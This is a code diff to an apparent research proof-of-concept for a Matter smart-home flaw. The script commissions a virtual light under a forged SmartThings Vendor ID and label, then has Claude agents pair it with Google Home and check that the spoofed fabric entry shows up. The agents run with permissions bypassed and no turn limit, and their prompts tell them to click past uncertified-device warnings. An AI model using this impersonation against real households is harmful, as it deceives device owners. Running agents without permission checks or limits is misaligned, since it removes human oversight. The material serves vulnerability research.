@@ -31,7 +31,7 @@ STORAGE_PATH = str(Path(__file__).parent / "storage" / "virtual-device")
 MATTER_PORT  = 5542
 
 # ── Flaw Type 4 test parameters ──────────────────────────────────────────────
-DEVICE_NAME      = "UMCCI OnOff Light"   # must match the name set in DeviceNode.ts
+DEVICE_NAME      = "UMCCI-OnOff-Light"   # must match the name set in DeviceNode.ts
 ATTACKER_NODE_ID = 2          # chip-tool's local node-ID for the virtual device
 FORGED_VENDOR_ID = 4362       # SmartThings VID (confirmed in NDSS 2025 paper Table II)
 FORGED_LABEL     = "SmartThings Hub"
@@ -144,15 +144,15 @@ async function main() {
         network: { port },
         commissioning: { passcode, discriminator },
         productDescription: {
-            name: "UMCCI OnOff Light",
+            name: "UMCCI-OnOff-Light",
             deviceType: DeviceTypeId(OnOffLightDevice.deviceType),
         },
         basicInformation: {
             vendorName: "umcci-demo",
             vendorId: VendorId(vendorId),
-            nodeLabel: "UMCCI OnOff Light",
-            productName: "UMCCI OnOff Light",
-            productLabel: "UMCCI OnOff Light",
+            nodeLabel: "UMCCI-OnOff-Light",
+            productName: "UMCCI-OnOff-Light",
+            productLabel: "UMCCI-OnOff-Light",
             productId,
             serialNumber: `umcci-${uniqueId}`,
             uniqueId,
@@ -192,7 +192,7 @@ def _ensure_matter_device() -> None:
 
     (matter_dir / "package.json").write_text(_PACKAGE_JSON)
     (matter_dir / "tsconfig.json").write_text(_TSCONFIG_JSON)
-    (src_dir / "DeviceNode.ts").write_text(_DEVICE_NODE_TS.replace("UMCCI OnOff Light", DEVICE_NAME))
+    (src_dir / "DeviceNode.ts").write_text(_DEVICE_NODE_TS.replace("UMCCI-OnOff-Light", DEVICE_NAME))
     log("  Source files written.")
 
     log("  Running npm install...")
@@ -260,17 +260,20 @@ def start_matter_device() -> tuple[subprocess.Popen, str | None]:
     pairing_code: str | None = None
     ready = threading.Event()
 
+    _ansi_escape = re.compile(r"\x1b\[[0-9;]*m")
+
     def _reader() -> None:
         nonlocal pairing_code
         assert proc.stdout is not None
         for raw in proc.stdout:
             line = raw.rstrip()
             log_debug(line)
-            m = re.search(r"manual pairing code:\s*([\d-]+)", line, re.IGNORECASE)
+            clean = _ansi_escape.sub("", line)
+            m = re.search(r"manual pairing code:\s*([\d-]+)", clean, re.IGNORECASE)
             if m:
                 pairing_code = m.group(1).replace("-", "")
                 ready.set()
-            if any(kw in line.lower() for kw in
+            if any(kw in clean.lower() for kw in
                    ["uncommissioned", "commissioned", "server listening", "node started"]):
                 ready.set()
 
@@ -348,7 +351,7 @@ def chip_tool_open_commissioning_window() -> str | None:
         "pairing", "open-commissioning-window",
         ATTACKER_NODE_ID,
         "1",     # ECM
-        "300",   # window timeout (seconds)
+        "900",   # window timeout (seconds)
         "1000",  # PBKDF iterations
         "3840",  # discriminator
         timeout=60,
@@ -364,6 +367,7 @@ def chip_tool_open_commissioning_window() -> str | None:
 
 # ── Step 4/5: Claude agent tasks ──────────────────────────────────────────────
 
+
 async def run_agent(prompt: str, task_name: str) -> str:
     """
     Run a Claude agent task using the user's Claude Code settings,
@@ -373,19 +377,32 @@ async def run_agent(prompt: str, task_name: str) -> str:
     opts = ClaudeAgentOptions(
         permission_mode="bypassPermissions",
         setting_sources=["user"],   # inherit mobile-mcp from ~/.claude/settings.json
-        max_turns=50,
+        max_turns=None,             # no turn limit
     )
     parts: list[str] = []
-    async for msg in query(prompt=prompt, options=opts):
-        if isinstance(msg, AssistantMessage):
-            for block in msg.content:
-                if isinstance(block, TextBlock) and block.text.strip():
-                    preview = block.text[:300].replace("\n", " ")
-                    print(f"  [agent] {preview}")
-                    parts.append(block.text)
-        elif isinstance(msg, ResultMessage):
-            cost = f"${msg.total_cost_usd:.4f}" if msg.total_cost_usd else "N/A"
-            log(f"Agent task complete (cost: {cost})")
+    try:
+        async for msg in query(prompt=prompt, options=opts):
+            if isinstance(msg, AssistantMessage):
+                for block in msg.content:
+                    if isinstance(block, TextBlock) and block.text.strip():
+                        print(f"  [agent] {block.text}")
+                        parts.append(block.text)
+            elif isinstance(msg, ResultMessage):
+                cost = f"${msg.total_cost_usd:.4f}" if msg.total_cost_usd else "N/A"
+                log(
+                    f"Agent task complete | cost={cost}"
+                    f" | stop_reason={msg.stop_reason!r}"
+                    f" | is_error={msg.is_error}"
+                    f" | num_turns={msg.num_turns}"
+                    + (f" | errors={msg.errors}" if msg.errors else "")
+                )
+                break  # ResultMessage signals end of agent run; stop iterating
+    except Exception as e:
+        if parts:
+            # Agent produced output before the exception — treat as success
+            log(f"Warning: agent stream closed with error (ignored, result captured): {e}")
+        else:
+            raise
     return "\n".join(parts)
 
 
@@ -401,12 +418,15 @@ Instructions:
 2. Open Google Home app (package: com.google.android.apps.chromecast.app). If already open, proceed.
 3. Add a new device:
    - Tap the "+" / "Add" button (bottom-right or top-right corner).
-   - Choose "Set up device" → "New device" (or "Matter-enabled device").
-   - When asked to scan a QR code, look for a "Setup without QR code" or "Enter code manually" option.
-   - Enter pairing code: {pairing_code}
+   - Choose "Device" (or "Matter-enabled device").
+   - When asked to scan a QR code, look for a "Add a different way" or "Use pairing code" or "Enter code manually" option.
+   - Enter pairing code: {pairing_code}. Than click "Continue" or "Next".
+   - If there is a request, click "Agree" or "I'm ready".
 4. If prompted with "Uncertified device" or "Device not certified by Google", tap "Set up anyway" / "Add anyway".
-5. Complete the setup wizard — accept defaults for room assignment and device name.
-6. Confirm the device now appears in the Google Home device list.
+5. If asked "Where is this device?", just select the top option and continue without changing any settings.
+6. If asked "Create a unique name", first clear the shown default name. And then enter "{device_name}" to make it easier to find later. Otherwise, proceed with the default name.
+7. Wait for the pairing process to complete. You might need to wait up to 1-2 minutes for the process to finish and for the device to appear in the list.
+7. Confirm the device now appears in the Google Home device list.
 
 If the device is already paired (you can see "{device_name}" or similar in Google Home), report success and skip.
 
@@ -432,6 +452,7 @@ to expand them and look for "{device_name}" among the individual devices listed.
 4. Once found, LONG-PRESS the "{device_name}" tile to open its control/detail page.
 5. Tap the gear icon (⚙️) or "Settings" button to open device settings.
 6. Tap "Linked Matter apps & services" (subtitle: "Can control and manage this device").
+  - If it says "Something went wrong" or fails to load, go back one step and try again.
 7. Take a screenshot of the resulting page — it shows all Matter fabrics linked to this device, \
    each with a Vendor ID and display label.
 8. Report the EXACT text of every entry listed, including Vendor ID values and labels.
@@ -449,8 +470,15 @@ async def main() -> None:
     parser = argparse.ArgumentParser(description="UMCCI Checker Demo — Flaw Type 4")
     parser.add_argument("--debug", action="store_true",
                         help="Print matter.js virtual device output (hidden by default)")
+    parser.add_argument("--verify", action="store_true",
+                        help="Skip pairing; assume device is already paired and go straight "
+                             "to the verification step")
+    parser.add_argument("--device-name", default=None, metavar="NAME",
+                        help=f"Device name to look for in Google Home "
+                             f"(default: {DEVICE_NAME!r})")
     args = parser.parse_args()
     _debug = args.debug
+    device_name: str = args.device_name if args.device_name else DEVICE_NAME
 
     print()
     print("=" * 60)
@@ -471,7 +499,11 @@ async def main() -> None:
     proc, pairing_code = start_matter_device()
 
     try:
-        if not already_commissioned:
+        if args.verify:
+            # ── --verify mode: skip pairing, go straight to verification ──────
+            log(f"--verify mode: skipping pairing, device name = {device_name!r}")
+
+        elif not already_commissioned:
             # ── 2. Fresh device: attack + pairing flow ─────────────────────────
             if pairing_code is None:
                 raise RuntimeError(
@@ -490,7 +522,7 @@ async def main() -> None:
 
             # Agent: pair Google Home
             await run_agent(
-                _PAIR_PROMPT.format(pairing_code=new_code, device_name=DEVICE_NAME),
+                _PAIR_PROMPT.format(pairing_code=new_code, device_name=device_name),
                 "Pair Google Home with virtual device",
             )
 
@@ -506,7 +538,7 @@ async def main() -> None:
         # ── 4. Agent: verify forged fabric info in Google Home UI ──────────────
         result = await run_agent(
             _VERIFY_PROMPT.format(
-                device_name=DEVICE_NAME,
+                device_name=device_name,
                 forged_vid=FORGED_VENDOR_ID,
                 forged_label=FORGED_LABEL,
             ),
@@ -520,6 +552,7 @@ async def main() -> None:
         print("=" * 60)
         print(f"  Forged Vendor ID : {FORGED_VENDOR_ID}  (impersonating SmartThings)")
         print(f"  Forged Label     : {FORGED_LABEL}")
+        print(f"  Device name      : {device_name}")
         print()
         print("Verification findings (from agent):")
         print("-" * 40)
@@ -537,3 +570,6 @@ async def main() -> None:
 
 if __name__ == "__main__":
     asyncio.run(main())
+
+# TODO: [agent] An image in the conversation exceeds the dimension limit for many-image requests (2000px). Start a new session with fewer images.
+# This bug will cause the agent's session to end prematurely!
